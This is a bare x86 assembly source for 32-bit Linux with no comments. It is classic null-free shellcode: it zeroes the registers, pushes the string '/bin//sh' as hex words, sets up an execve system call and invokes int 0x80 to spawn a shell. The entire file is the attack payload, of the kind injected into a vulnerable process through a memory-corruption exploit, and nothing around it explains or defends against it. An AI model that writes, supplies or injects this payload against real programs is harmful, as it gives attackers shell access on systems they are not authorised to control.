section .text

global _start

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov al, 11

    push ebx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    int 0x80
